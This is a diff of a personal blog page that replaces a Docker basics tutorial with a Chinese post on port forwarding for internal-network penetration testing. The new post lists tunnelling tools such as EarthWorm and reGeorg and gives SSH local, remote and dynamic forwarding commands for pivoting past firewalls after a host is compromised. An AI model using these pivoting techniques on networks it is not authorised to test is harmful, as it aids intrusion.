@@ -79,20 +79,24 @@
 
 
 
-<meta name="description" content="Docker 容器使用使用 Docker 创建 Web 应用 拉取镜像 docker pull training/webapp   创建容器 docker run -d -p 7878:5000 training/webapp python app.py-d 后台运行，不关联到当前终端-p 指定主机和容器的端口映射      访问web页面由于使用了 -p 7878:5000，将 主机的7878端">
+<meta name="description" content="在获取一个目标攻击机之后，接着进行域渗透时，可能会遇见一些特殊情况，此时需要的是利用nc，lcx等工具进行端口转发。  适用端口转发的网络环境有以下几种：   服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。对于以上三种情况，传统的方法可以突破1和2两种（全都可以理">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Docker （二）容器与镜像基础使用">
-<meta property="og:url" content="http://wcute.github.io/2019/02/28/Docker （二）容器与镜像基础使用/index.html">
+<meta property="og:title" content="内网渗透之端口转发">
+<meta property="og:url" content="http://wcute.github.io/2019/04/11/内网渗透之端口转发/index.html">
 <meta property="og:site_name" content="鸡翅儿">
-<meta property="og:description" content="Docker 容器使用使用 Docker 创建 Web 应用 拉取镜像 docker pull training/webapp   创建容器 docker run -d -p 7878:5000 training/webapp python app.py-d 后台运行，不关联到当前终端-p 指定主机和容器的端口映射      访问web页面由于使用了 -p 7878:5000，将 主机的7878端">
+<meta property="og:description" content="在获取一个目标攻击机之后，接着进行域渗透时，可能会遇见一些特殊情况，此时需要的是利用nc，lcx等工具进行端口转发。  适用端口转发的网络环境有以下几种：   服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。对于以上三种情况，传统的方法可以突破1和2两种（全都可以理">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-9bc1c78f43d9b48b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-c616107d99d07d08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-03-31T01:17:27.940Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-038679bb80d0ba69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-7a95885b756ed690.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-97107c2676fb8d2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-98ca535fe665403f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-1bcccfa847ba3d93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-7080298eb4e6a964.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-04-11T09:52:07.057Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Docker （二）容器与镜像基础使用">
-<meta name="twitter:description" content="Docker 容器使用使用 Docker 创建 Web 应用 拉取镜像 docker pull training/webapp   创建容器 docker run -d -p 7878:5000 training/webapp python app.py-d 后台运行，不关联到当前终端-p 指定主机和容器的端口映射      访问web页面由于使用了 -p 7878:5000，将 主机的7878端">
-<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/12585049-9bc1c78f43d9b48b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta name="twitter:title" content="内网渗透之端口转发">
+<meta name="twitter:description" content="在获取一个目标攻击机之后，接着进行域渗透时，可能会遇见一些特殊情况，此时需要的是利用nc，lcx等工具进行端口转发。  适用端口转发的网络环境有以下几种：   服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。对于以上三种情况，传统的方法可以突破1和2两种（全都可以理">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/12585049-038679bb80d0ba69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -122,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://wcute.github.io/2019/02/28/Docker （二）容器与镜像基础使用/">
+  <link rel="canonical" href="http://wcute.github.io/2019/04/11/内网渗透之端口转发/">
 
 
 
 
 
-  <title>Docker （二）容器与镜像基础使用 | 鸡翅儿</title>
+  <title>内网渗透之端口转发 | 鸡翅儿</title>
   
 
 
@@ -287,7 +291,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2019/02/28/Docker （二）容器与镜像基础使用/">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2019/04/11/内网渗透之端口转发/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wcute">
@@ -304,7 +308,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Docker （二）容器与镜像基础使用</h1>
+          <h1 class="post-title" itemprop="name headline">内网渗透之端口转发</h1>
         
 
         <div class="post-meta">
@@ -316,8 +320,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-28T13:00:00+08:00">
-                2019-02-28
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-11T17:53:03+08:00">
+                2019-04-11
               </time>
             
 
@@ -339,8 +343,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Docker/" itemprop="url" rel="index">
-                    <span itemprop="name">Docker</span>
+                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
                   </a>
                 </span>
 
@@ -376,65 +380,64 @@
       
 
       
-        <h3 id="Docker-容器使用"><a href="#Docker-容器使用" class="headerlink" title="Docker 容器使用"></a>Docker 容器使用</h3><h4 id="使用-Docker-创建-Web-应用"><a href="#使用-Docker-创建-Web-应用" class="headerlink" title="使用 Docker 创建 Web 应用"></a>使用 Docker 创建 Web 应用</h4><ol>
-<li>拉取镜像<blockquote>
-<p>docker pull training/webapp</p>
-</blockquote>
-</li>
-<li>创建容器<blockquote>
-<p>docker run -d -p 7878:5000 training/webapp python app.py<br>-d 后台运行，不关联到当前终端<br>-p 指定主机和容器的端口映射</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-9bc1c78f43d9b48b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<ol start="3">
-<li>访问<code>web</code>页面<br>由于使用了 <code>-p 7878:5000</code>，将 <code>主机的7878端口</code>映射到<code>容器的5000端口</code><br>此时通过访问主机的7878端口即可访问到容器运行的网页</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-c616107d99d07d08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<h4 id="容器基础操作命令"><a href="#容器基础操作命令" class="headerlink" title="容器基础操作命令"></a>容器基础操作命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">[root@wcute ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">a8839d758dce        training/webapp     &quot;python app.py&quot;     6 minutes ago       Up 6 minutes        0.0.0.0:7878-&gt;5000/tcp   silly_payne</span><br><span class="line"></span><br><span class="line"># 指定id查看端口映射</span><br><span class="line">[root@wcute ~]# docker port a88 </span><br><span class="line">5000/tcp -&gt; 0.0.0.0:7878</span><br><span class="line"></span><br><span class="line"># 指定NAMES查看端口映射</span><br><span class="line">5000/tcp -&gt; 0.0.0.0:7878</span><br><span class="line">[root@wcute ~]# docker port silly</span><br><span class="line">Error: No such container: silly</span><br><span class="line">[root@wcute ~]# docker port silly_payne</span><br><span class="line"></span><br><span class="line"># 查看WEB应用日志</span><br><span class="line">[root@wcute ~]# docker logs a88 </span><br><span class="line"> * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</span><br><span class="line">42.238.187.23 - - [12/Jan/2019 09:18:34] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">42.238.187.23 - - [12/Jan/2019 09:18:34] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br><span class="line"></span><br><span class="line"># 查看WEB应用程序容器的进程</span><br><span class="line">[root@wcute ~]# docker top a88</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                30965               30940               0                   17:18               ?                   00:00:00            python app.py</span><br><span class="line"></span><br><span class="line"># 检查 WEB 应用程序</span><br><span class="line">[root@wcute ~]# docker inspect a88</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;a8839d758dcec337dc6c48215467354ae12a6743dac7cd8fd78de87c2a0232ec&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2019-01-12T09:18:28.646596277Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;python&quot;,</span><br><span class="line">        &quot;Args&quot;: [</span><br><span class="line">            &quot;app.py&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;Running&quot;: true,</span><br><span class="line">                                       ...........省略</span><br><span class="line"></span><br><span class="line"># 重启web容器</span><br><span class="line">[root@wcute ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">a8839d758dce        training/webapp     &quot;python app.py&quot;     17 minutes ago      Up 17 minutes       0.0.0.0:7878-&gt;5000/tcp   silly_payne</span><br><span class="line">[root@wcute ~]# docker stop a88</span><br><span class="line">a88</span><br><span class="line">[root@wcute ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">[root@wcute ~]# docker start a8839</span><br><span class="line">a8839</span><br><span class="line">[root@wcute ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">a8839d758dce        training/webapp     &quot;python app.py&quot;     18 minutes ago      Up 3 seconds        0.0.0.0:7878-&gt;5000/tcp   silly_payne</span><br><span class="line"></span><br><span class="line"># 移除WEB应用容器（移除前需要先停止）</span><br><span class="line">[root@wcute ~]# docker rm a88</span><br><span class="line">Error response from daemon: You cannot remove a running container a8839d758dcec337dc6c48215467354ae12a6743dac7cd8fd78de87c2a0232ec. Stop the container before attempting removal or force remove</span><br><span class="line">[root@wcute ~]# docker stop a88</span><br><span class="line">a88</span><br><span class="line">[root@wcute ~]# docker rm a88</span><br><span class="line">a88</span><br></pre></td></tr></table></figure>
-<h3 id="Docker-镜像使用"><a href="#Docker-镜像使用" class="headerlink" title="Docker 镜像使用"></a>Docker 镜像使用</h3><h4 id="镜像基础操作命令"><a href="#镜像基础操作命令" class="headerlink" title="镜像基础操作命令"></a>镜像基础操作命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 查看已有镜像</span><br><span class="line">[root@wcute ~]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              15.10               9b9cb95443b5        2 years ago         137MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        3 years ago         349MB</span><br><span class="line"></span><br><span class="line"># 查找镜像</span><br><span class="line">[root@wcute ~]# docker search web</span><br><span class="line">NAME                                      DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">php                                       While designed for web development, the PHP …   4231                [OK]</span><br><span class="line">rails                                     Rails is an open-source web application fram…   800                 [OK]</span><br><span class="line">django                                    Django is a free web application framework, …   780                 [OK]</span><br><span class="line">redmine                                   Redmine is a flexible project management web…   691                 [OK]</span><br><span class="line"></span><br><span class="line"># 获取新镜像</span><br><span class="line">-bash: syntax error near unexpected token `do&apos;</span><br><span class="line">[root@wcute ~]# docker pull php</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/php</span><br><span class="line">177e7ef0df69: Pull complete</span><br><span class="line">...</span><br><span class="line">9bf89f2eda24: Pull complete</span><br><span class="line">Digest: sha256:cb0c75db3b60d1ab913909cda871a87e11e9294120288ef9239c990d11c6a998</span><br><span class="line">Status: Downloaded newer image for php:latest</span><br><span class="line"></span><br><span class="line"># 运行镜像</span><br><span class="line">[root@wcute ~]# docker run php</span><br><span class="line">Interactive shell</span><br></pre></td></tr></table></figure>
-<h3 id="使用Dockerfile创建镜像"><a href="#使用Dockerfile创建镜像" class="headerlink" title="使用Dockerfile创建镜像"></a>使用Dockerfile创建镜像</h3><h4 id="Dockerfile-结构"><a href="#Dockerfile-结构" class="headerlink" title="Dockerfile 结构"></a>Dockerfile 结构</h4><ul>
-<li>基础镜像信息（可以从本地已有镜像获取 也可以从默认<code>DockerHub</code>获取）</li>
-<li>维护者信息</li>
-<li>镜像操作指令</li>
-<li>容器启动时执行指令</li>
+        <p>在获取一个目标攻击机之后，接着进行域渗透时，可能会遇见一些特殊情况，此时需要的是利用nc，lcx等工具进行端口转发。</p>
+<ul>
+<li>适用端口转发的网络环境有以下几种：</li>
 </ul>
-<h4 id="Dockerfile-指令"><a href="#Dockerfile-指令" class="headerlink" title="Dockerfile 指令"></a>Dockerfile 指令</h4><ul>
-<li><p>FROM<br>指定镜像名称<br>格式为FROM <image> 或FROM <image>:<tag><br>例如FROM ubuntu 或 FROM ubuntu:12.04　</tag></image></image></p>
-</li>
-<li><p>MAINTAINER<br>镜像作者<br>格式为 MAINTAINER <name></name></p>
-</li>
-<li><p>RUN<br>构建镜像时运行的命令，格式为 RUN <command> 或 RUN [“executable”, “param1”, “param2”]。<br>前者将在 shell 终端中运行命令，即 /bin/sh -c；后者则使用 exec 执行。</p>
-</li>
-<li><p>CMD<br>运行容器时执行的命令，CMD [“executable”,”param1’,”param2”] 使用 exec 执行。<br>CMD command param1 param2 在 /bin/sh 中执行，提供给需要交互的应用。<br>CMD [“param1”,”param2”] 提供给 ENTRYPOINT 的默认参数。<br>指定启动容器时执行的命令，每个Dockerfile 只能有一条 CMD命令。如果指定了多条命令，只有最后一条会被执行。<br>如果用户启动容器时指定了运行的命令，则会覆盖掉 CMD 指定的命令。</p>
-</li>
-<li><p>EXPOSE<br>格式为 EXPOSE <port> [<port>…]。<br>告诉 Docker 服务端容器暴露的端口号，供互联系统使用。在启动容器时需要通过 -P，Docker 主机会自动分配一个端口转发到指定的端口。</port></port></p>
-</li>
-<li><p>ADD<br>格式：ADD <src> <dest><br>ADD <a href="http://www.baidu.com/1.tar.gz" target="_blank" rel="noopener">http://www.baidu.com/1.tar.gz</a> /var/www/html<br>拷贝文件或目录到镜像，如果是 url 或压缩包会自动下载或自动解压</dest></src></p>
-</li>
-<li><p>VOLUME<br>格式：VOLUME [“/var/www”]<br>指定容器挂载点到宿主机自动生成的目录或其他容器</p>
-</li>
-<li><p>WORKDIR<br>格式：WORKDIR <dir><br>为 RUN CMD COPY ADD ENTRPOINT 设置工作目录</dir></p>
+<ol>
+<li>服务器处于内网，可以访问外部网络。</li>
+<li>服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</li>
+<li>服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。<br>对于以上三种情况，传统的方法可以突破1和2两种（全都可以理解为<code>lcx</code>），第三者可以使用<code>SOCKS</code>代理<br><img src="https://upload-images.jianshu.io/upload_images/12585049-038679bb80d0ba69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></li>
+</ol>
+<h4 id="SOCKS-常用代理工具"><a href="#SOCKS-常用代理工具" class="headerlink" title="SOCKS 常用代理工具"></a>SOCKS 常用代理工具</h4><h5 id="Earthworm"><a href="#Earthworm" class="headerlink" title="Earthworm"></a>Earthworm</h5><p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。<br>目前已经有了最新版Termite。工具网址：<a href="http://rootkiter.com/EarthWorm" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm</a></p>
+<h5 id="reGeorgre"><a href="#reGeorgre" class="headerlink" title="reGeorgre"></a>reGeorgre</h5><p>Georg是reDuh的升级版，主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php或jsp这些web程序中的一种。工具网址：<a href="https://github.com/NoneNotNull/reGeorg" target="_blank" rel="noopener">https://github.com/NoneNotNull/reGeorg</a></p>
+<h5 id="sSocks"><a href="#sSocks" class="headerlink" title="sSocks"></a>sSocks</h5><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13。工具网址：<a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">http://sourceforge.net/projects/ssocks/</a></p>
+<h5 id="SocksCap64"><a href="#SocksCap64" class="headerlink" title="SocksCap64"></a>SocksCap64</h5><p>SocksCap64是一款在windows下相当好使的全局代理软件。SocksCap64可以使Windows应用程序通过SOCKS代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持SOCKS代理的应用程序通过SocksCap64之后都可以完美的实现代理访问。工具网址：<a href="http://www.sockscap64.com(需翻墙)" target="_blank" rel="noopener">http://www.sockscap64.com(需翻墙)</a></p>
+<h5 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h5><p>Proxychains是一款在LINUX下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通過代理上網，允許TCP和DNS通過代理隧道，支持HTTP、SOCKS4、SOCKS5類型的代理服務器，支持proxy chain，即可配置多個代理，同一個proxy chain可使用不同類型的代理服務器。工具网址：<a href="http://proxychains.sourceforge.net/" target="_blank" rel="noopener">http://proxychains.sourceforge.net/</a></p>
+<h4 id="SSH-隧道代理转发"><a href="#SSH-隧道代理转发" class="headerlink" title="SSH 隧道代理转发"></a>SSH 隧道代理转发</h4><ul>
+<li>常用命令<br>本地访问127.0.0.1:port1就是host:port2(用的更多)<br>   <code>ssh -CfNg -L port1:127.0.0.1:port2 user@host</code>   #本地转发<br>访问host:port2就是访问127.0.0.1:port1<br>  <code>ssh -CfNg -R port2:127.0.0.1:port1 user@host</code>   #远程转发<br>可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口<br>  <code>ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip</code>  #正向隧道，监听本地port<br>可以将dmz_host的hostport端口转发到remote_ip的port端口<br>  <code>ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip</code>   #反向隧道，用于内网穿透防火墙限制之类<br>socket代理:<br>   <code>ssh -qTfnN -D port remotehost</code></li>
+<li>参数详解：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-q Quiet mode. 安静模式</span><br><span class="line">-T Disable pseudo-tty allocation. 不占用 shell 了</span><br><span class="line">-f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数</span><br><span class="line">-N Do not execute a remote command. 不执行远程命令，端口转发就用它了</span><br><span class="line">-L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport</span><br><span class="line">-R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport</span><br><span class="line">-D port 指定一个本地机器 &quot;动态的&quot; 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS协议, 将充当SOCKS服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h4 id="Dockerfile-创建镜像"><a href="#Dockerfile-创建镜像" class="headerlink" title="Dockerfile 创建镜像"></a>Dockerfile 创建镜像</h4><ol>
-<li><p>创建一个文件夹，并新建一个Dockerfile文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@wcute Dockerfile]# vi Dockerfile</span><br><span class="line">[root@wcute Dockerfile]#  [New] 3L, 66C written</span><br><span class="line">[root@wcute Dockerfile]# cat Dockerfile</span><br><span class="line">FROM ubuntu:latest</span><br><span class="line">MAINTAINER wcute</span><br><span class="line">CMD echo &apos; wcute is so cute &apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用<code>build</code>命令编译生成镜像</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> # . 表示在当前路径下</span><br><span class="line">[root@wcute Dockerfile]# docker build .</span><br><span class="line">Sending build context to Docker daemon  2.048kB</span><br><span class="line">Step 1/3 : FROM ubuntu:latest</span><br><span class="line">latest: Pulling from library/ubuntu</span><br><span class="line">6cf436f81810: Pull complete</span><br><span class="line">987088a85b96: Pull complete</span><br><span class="line">b4624b3efe06: Pull complete</span><br><span class="line">d42beb8ded59: Pull complete</span><br><span class="line">Digest: sha256:7a47ccc3bbe8a451b500d2b53104868b46d60ee8f5b35a24b41a86077c650210</span><br><span class="line">Status: Downloaded newer image for ubuntu:latest</span><br><span class="line"> ---&gt; 47b19964fb50</span><br><span class="line">Step 2/3 : MAINTAINER wcute</span><br><span class="line"> ---&gt; Running in ad5b043ef12a</span><br><span class="line">Removing intermediate container ad5b043ef12a</span><br><span class="line"> ---&gt; 2ee3d5ef3a5b</span><br><span class="line">Step 3/3 : CMD echo &apos; wcute is so cute &apos;</span><br><span class="line"> ---&gt; Running in 7a8df68e1b9e</span><br><span class="line">Removing intermediate container 7a8df68e1b9e</span><br><span class="line"> ---&gt; 7198213cefad</span><br><span class="line">Successfully built 7198213cefad</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看新生成的镜像</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@wcute Dockerfile]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">&lt;none&gt;              &lt;none&gt;              7198213cefad        13 minutes ago      88.1MB</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>运行新生成的镜像</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@wcute Dockerfile]# docker run --rm 7198</span><br><span class="line"> wcute is so cute</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>删除镜像</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@wcute Dockerfile]# docker rmi 7198</span><br><span class="line">Deleted: sha256:7198213cefadf82dec00a697da110c82031ffa0e0931d90ccf1bf637c89bff51</span><br><span class="line">Deleted: sha256:2ee3d5ef3a5b76b6bbb8902111bf30f5ab38dd338be61490cf141060ea5102bc</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>参考链接：<a href="http://www.cnblogs.com/fengzheng/p/5181222.html" target="_blank" rel="noopener">http://www.cnblogs.com/fengzheng/p/5181222.html</a></p>
+<h5 id="ssh-本地转发"><a href="#ssh-本地转发" class="headerlink" title="ssh 本地转发"></a>ssh 本地转发</h5><p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就访问到了内网的端口。<br>远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到1234端口。<br><code>ssh -CfNg -L 1234 127.0.0.1:3306 root@45.32.31.121</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-7a95885b756ed690.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h5 id="ssh-远程转发"><a href="#ssh-远程转发" class="headerlink" title="ssh 远程转发"></a>ssh 远程转发</h5><p>内网的服务器，外网不能直接访问，使用远程转发，将内外的服务器端口转发到外网端口。这时候访问外网的端口，就访问到了内网的端口。<br><code>ssh -CfNg -R 81:127.0.0.1:80 root@192.168.153.142</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-97107c2676fb8d2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-98ca535fe665403f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>现在在192.168.153.142访问127.0.0.1:81就是访问内网的端口。</p>
+<h5 id="ssh动态转发socks代理"><a href="#ssh动态转发socks代理" class="headerlink" title="ssh动态转发socks代理"></a>ssh动态转发socks代理</h5><p>把远程主机设置成代理，来代理访问不能访问的资源。在本地机器上分配了一个监听端口，一旦这个端口上有了连接，该连接就经过ssh隧道转发出去，根据应用程序的协议可以判断出远程主机将和哪里连接。<br><code>ssh -qTfnN -D 1080  root@45.32.31.121</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-1bcccfa847ba3d93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-7080298eb4e6a964.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
